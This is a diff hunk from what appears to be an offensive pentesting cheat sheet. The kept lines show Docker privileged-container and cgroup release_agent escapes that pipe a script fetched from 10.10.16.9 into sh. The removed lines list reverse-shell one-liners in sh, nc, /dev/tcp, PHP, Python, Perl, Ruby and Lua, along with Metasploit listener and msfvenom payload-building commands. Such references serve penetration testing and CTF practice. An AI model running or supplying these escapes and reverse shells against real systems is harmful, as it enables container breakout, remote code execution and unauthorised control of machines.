@@ -1370,31 +1370,6 @@ docker run -v /:/mnt --rm --privileged REPOSITORY chroot /mnt bash -c 'curl 10.1
 cat docker-compose.yml | grep 'privileged: true'
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`;mkdir -p $d/w;echo 1 >$d/w/notify_on_release;t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`;echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.16.9/resh | sh' >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
 
-[*] Shells
-+---------- One Liners ----------+
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $MYIP 80 >/tmp/f 
-/bin/sh -i >& /dev/tcp/$MYIP/5555 0>&1
-php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
-python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
-perl -e 'use Socket;$i="$MYIP";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-ruby -rsocket -e'f=TCPSocket.open("$MYIP",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-lua -e "require('socket');require('os');t=socket.tcp();t:connect('$MYIP','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');"
-
-+---------- Listeners ----------+
-rlwrap nc -lvnp 80
-rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/shell/reverse_tcp; run"
-rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/meterpreter/reverse_tcp; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHOST $MYIP; set LPORT 7777; run"
-
-+---------- MSFVenom ----------+
-msfvenom -p php/reverse_php LHOST=$MYIP LPORT=80 -f raw -o shell.php
-msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.php
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f elf -o shell.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f elf -o shell.elf
-msfvenom -p python/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f raw -o shell.py
-msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.py
-
 ## Windows
 [*] Initial Shell
 +---------- Execute ----------+
